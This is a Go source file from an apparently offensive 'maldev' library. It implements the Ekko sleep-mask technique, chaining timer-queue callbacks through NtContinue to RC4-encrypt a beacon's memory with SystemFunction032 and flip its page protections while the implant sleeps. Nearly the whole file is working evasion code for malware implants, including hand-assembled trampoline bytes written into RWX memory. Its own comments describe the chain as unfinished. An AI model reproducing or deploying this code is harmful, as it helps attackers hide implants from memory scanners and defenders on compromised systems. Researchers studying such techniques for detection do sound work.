//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// EkkoStrategy is the L2-full strategy: a faithful port of Peter
// Winter-Smith's Ekko. Six CONTEXTs are crafted so that a chain of
// CreateTimerQueueTimer(NtContinue, &ctxN) diverts the pool thread
// through VirtualProtect(RW), SystemFunction032 (RC4 encrypt),
// WaitForSingleObjectEx (the actual sleep), SystemFunction032
// (decrypt), VirtualProtect(restore), and finally a resume stub that
// signals completion + exits. During the wait, the beacon thread's
// RIP sits inside VirtualProtect or SystemFunction032 or
// WaitForSingleObjectEx — never in Sleep/SleepEx.
//
// Constraints:
//   - windows + amd64 only (plan9 asm resume stub)
//   - Cipher must be *RC4Cipher (chain hardcodes SystemFunction032)
//   - runtime.LockOSThread is held during Cycle (the captured CONTEXT
//     must correspond to a stable OS thread)
//
// Status (v0.12.0): scaffold + input validation ship. The ROP chain
// itself is WIP — RtlCaptureContext requires 16-byte CONTEXT alignment,
// each gadget's Rsp must be aligned so the called API sees the post-CALL
// state (Rsp % 16 == 8), and UNICODE_STRING args for SystemFunction032
// must live outside the called function's shadow space. Round-trip test
// is skipped until these are resolved.
type EkkoStrategy struct{}

// resumeStub is implemented in plan9 asm (strategy_ekko_amd64.s). Its
// address is used as Rip in the final CONTEXT of the chain. Never
// invoke it from Go code — it assumes a non-Go thread and calls
// ExitThread.
func resumeStub()

// Globals captured by the asm resume stub. Assigned before the first
// CreateTimerQueueTimer call of a Cycle.
var (
	ekkoResumeEvent    uintptr
	ekkoProcSetEvent   uintptr
	ekkoProcExitThread uintptr
)

// Re-used chainDone flag between the main and pool threads.
var ekkoChainDone atomic.Int32

// Gadget stack layout (one contiguous buffer per Cycle call):
//
//   +0x000  [trampoline bytes: 6 × 0x30] — 48 bytes of raw x64 code each
//           MOVQ ctxSlot(RIP), CX       48 8B 0D ?? ?? ?? ??
//           MOVQ $NtContinue, AX        48 B8 ?? ?? ?? ?? ?? ?? ?? ??
//           JMP  AX                     FF E0
//   +0x1E0  [ctxSlot pointers: 6 × 8 bytes] — &ctxN+1 addresses
//   +0x240  [shadow space & return frames: 6 × 0x30 bytes, Rsp bases per gadget]
//
// Each ctxN.Rsp = base of shadow region i. [Rsp+0x00] = &trampoline i+1.
// After gadget N's `ret`, the trampoline reads ctxSlot[N+1] into RCX and
// calls NtContinue with that CONTEXT.

// ekkoChain holds the 6 CONTEXTs + gadget stack for one Cycle.
type ekkoChain struct {
	ctxMain    api.Context64
	ctxProtRW  api.Context64
	ctxEncrypt api.Context64
	ctxWait    api.Context64
	ctxDecrypt api.Context64
	ctxProtRX  api.Context64
	ctxResume  api.Context64

	scratch     uintptr
	scratchSize uintptr

	trampBase     uintptr
	ctxSlotTable  uintptr
	gadgetStackAt func(i int) uintptr
}

// buildEkkoChain lays out the gadget stack, clones ctxMain into 6
// CONTEXTs, and wires each Rip/Rsp/Rcx/Rdx/R8/R9 for the corresponding
// gadget. Must be called AFTER RtlCaptureContext(&ch.ctxMain) and
// BEFORE the timers are scheduled.
func buildEkkoChain(
	ch *ekkoChain,
	region Region,
	key []byte,
	d time.Duration,
	hDummy windows.Handle,
	origProtectPtr *uint32,
) error {
	ch.scratchSize = 4096
	addr, err := windows.VirtualAlloc(0, ch.scratchSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("buildEkkoChain: VirtualAlloc scratch: %w", err)
	}
	ch.scratch = addr
	ch.trampBase = addr
	ch.ctxSlotTable = addr + 0x1E0
	shadowBase := addr + 0x240
	ch.gadgetStackAt = func(i int) uintptr { return shadowBase + uintptr(i)*0x30 }

	// --- Build the ctx-slot table (6 pointers) ---
	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(ch.ctxSlotTable)), 6)
	slots[0] = uintptr(unsafe.Pointer(&ch.ctxProtRW))
	slots[1] = uintptr(unsafe.Pointer(&ch.ctxEncrypt))
	slots[2] = uintptr(unsafe.Pointer(&ch.ctxWait))
	slots[3] = uintptr(unsafe.Pointer(&ch.ctxDecrypt))
	slots[4] = uintptr(unsafe.Pointer(&ch.ctxProtRX))
	slots[5] = uintptr(unsafe.Pointer(&ch.ctxResume))

	// --- Write trampoline bytes for each of the 6 gadgets ---
	ntContinueAddr := api.ProcNtContinue.Addr()
	for i := 0; i < 6; i++ {
		tr := ch.trampBase + uintptr(i)*0x30
		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), 0x30)
		// MOVQ ctxSlot[i](RIP), CX  — RIP-relative load
		// 48 8B 0D <rel32>
		b[0] = 0x48
		b[1] = 0x8B
		b[2] = 0x0D
		rel := int32(int64(ch.ctxSlotTable+uintptr(i)*8) - int64(tr+7))
		*(*int32)(unsafe.Pointer(&b[3])) = rel
		// MOVQ $NtContinue, AX
		// 48 B8 <u64>
		b[7] = 0x48
		b[8] = 0xB8
		*(*uint64)(unsafe.Pointer(&b[9])) = uint64(ntContinueAddr)
		// JMP AX (FF E0)
		b[17] = 0xFF
		b[18] = 0xE0
	}

	// --- Clone ctxMain 6× and patch Rip/args/Rsp ---
	region64 := func(r Region) (uint64, uint64) { return uint64(r.Addr), uint64(r.Size) }

	// Gadget 0: VirtualProtect(addr, size, PAGE_READWRITE, &origProtect)
	ch.ctxProtRW = ch.ctxMain
	ch.ctxProtRW.Rip = uint64(api.ProcVirtualProtect.Addr())
	ch.ctxProtRW.Rcx, ch.ctxProtRW.Rdx = region64(region)
	ch.ctxProtRW.R8 = uint64(windows.PAGE_READWRITE)
	ch.ctxProtRW.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
	ch.ctxProtRW.Rsp = uint64(ch.gadgetStackAt(0))
	*(*uintptr)(unsafe.Pointer(ch.gadgetStackAt(0))) = ch.trampBase + 0x30

	// Gadget 1: SystemFunction032 — RC4 encrypt in place.
	// UNICODE_STRING-shaped structs at rsp+0x10 (data) and rsp+0x20 (key).
	writeUSTR := func(at uintptr, length uint16, buf uintptr) {
		*(*uint16)(unsafe.Pointer(at)) = length
		*(*uint16)(unsafe.Pointer(at + 2)) = length
		*(*uint32)(unsafe.Pointer(at + 4)) = 0
		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
	}
	rspEnc := ch.gadgetStackAt(1)
	writeUSTR(rspEnc+0x10, uint16(region.Size), region.Addr)
	writeUSTR(rspEnc+0x20, uint16(len(key)), uintptr(unsafe.Pointer(&key[0])))
	*(*uintptr)(unsafe.Pointer(rspEnc)) = ch.trampBase + 2*0x30
	ch.ctxEncrypt = ch.ctxMain
	ch.ctxEncrypt.Rip = uint64(api.ProcSystemFunction032.Addr())
	ch.ctxEncrypt.Rcx = uint64(rspEnc + 0x10)
	ch.ctxEncrypt.Rdx = uint64(rspEnc + 0x20)
	ch.ctxEncrypt.Rsp = uint64(rspEnc)

	// Gadget 2: WaitForSingleObjectEx(hDummy, d_ms, FALSE)
	rspW := ch.gadgetStackAt(2)
	*(*uintptr)(unsafe.Pointer(rspW)) = ch.trampBase + 3*0x30
	ch.ctxWait = ch.ctxMain
	ch.ctxWait.Rip = uint64(api.ProcWaitForSingleObjectEx.Addr())
	ch.ctxWait.Rcx = uint64(hDummy)
	ch.ctxWait.Rdx = uint64(d / time.Millisecond)
	ch.ctxWait.R8 = 0
	ch.ctxWait.Rsp = uint64(rspW)

	// Gadget 3: SystemFunction032 — RC4 decrypt (self-inverse, same args).
	rspDec := ch.gadgetStackAt(3)
	writeUSTR(rspDec+0x10, uint16(region.Size), region.Addr)
	writeUSTR(rspDec+0x20, uint16(len(key)), uintptr(unsafe.Pointer(&key[0])))
	*(*uintptr)(unsafe.Pointer(rspDec)) = ch.trampBase + 4*0x30
	ch.ctxDecrypt = ch.ctxMain
	ch.ctxDecrypt.Rip = uint64(api.ProcSystemFunction032.Addr())
	ch.ctxDecrypt.Rcx = uint64(rspDec + 0x10)
	ch.ctxDecrypt.Rdx = uint64(rspDec + 0x20)
	ch.ctxDecrypt.Rsp = uint64(rspDec)

	// Gadget 4: VirtualProtect(addr, size, origProtect, &tmp)
	rspRX := ch.gadgetStackAt(4)
	*(*uintptr)(unsafe.Pointer(rspRX)) = ch.trampBase + 5*0x30
	ch.ctxProtRX = ch.ctxMain
	ch.ctxProtRX.Rip = uint64(api.ProcVirtualProtect.Addr())
	ch.ctxProtRX.Rcx, ch.ctxProtRX.Rdx = region64(region)
	ch.ctxProtRX.R8 = uint64(*origProtectPtr)
	ch.ctxProtRX.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
	ch.ctxProtRX.Rsp = uint64(rspRX)

	// Gadget 5: resumeStub (asm). Rsp needs shadow space anyway.
	rspResume := ch.gadgetStackAt(5)
	*(*uintptr)(unsafe.Pointer(rspResume)) = 0 // no further ret needed
	ch.ctxResume = ch.ctxMain
	ch.ctxResume.Rip = uint64(reflectFuncAddr(resumeStub))
	ch.ctxResume.Rsp = uint64(rspResume)

	return nil
}

// reflectFuncAddr returns the address of a Go func value.
func reflectFuncAddr(fn func()) uintptr {
	return **(**uintptr)(unsafe.Pointer(&fn))
}

func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/ekko: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/ekko: MVP supports exactly one region; multi-region chain is future work")
	}
	region := regions[0]

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	ekkoChainDone.Store(0)

	var chain ekkoChain
	r, _, _ := api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(&chain.ctxMain)))
	_ = r

	if ekkoChainDone.Load() == 1 {
		// Unreachable in this design (resumeStub does not RtlCaptureContext),
		// but keep a safety guard matching the reference Ekko implementation.
		api.ProcSetEvent.Call(uintptr(hCompletion))
		api.ProcExitThread.Call(0)
	}
	ekkoChainDone.Store(1)

	var origProtect uint32
	if err := buildEkkoChain(&chain, region, key, d, hDummy, &origProtect); err != nil {
		return err
	}
	defer windows.VirtualFree(chain.scratch, 0, windows.MEM_RELEASE)

	var hQueue windows.Handle
	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueue: %w", lastErr)
	}
	hQueue = windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	contexts := []*api.Context64{
		&chain.ctxProtRW, &chain.ctxEncrypt, &chain.ctxWait,
		&chain.ctxDecrypt, &chain.ctxProtRX, &chain.ctxResume,
	}
	delayMs := uint32(d / time.Millisecond)
	schedule := []uint32{100, 200, 300, 300 + delayMs + 100, 300 + delayMs + 200, 300 + delayMs + 300}

	var hTimers [6]windows.Handle
	for i, ctxPtr := range contexts {
		rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
			uintptr(unsafe.Pointer(&hTimers[i])),
			uintptr(hQueue),
			ntContinueAddr,
			uintptr(unsafe.Pointer(ctxPtr)),
			uintptr(schedule[i]),
			0,
			0, // WT_EXECUTEDEFAULT
		)
		if rc == 0 {
			return fmt.Errorf("sleepmask/ekko: CreateTimerQueueTimer gadget %d: %w", i, cErr)
		}
	}

	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	const invalidHandleValue = ^uintptr(0)
	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), invalidHandleValue)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
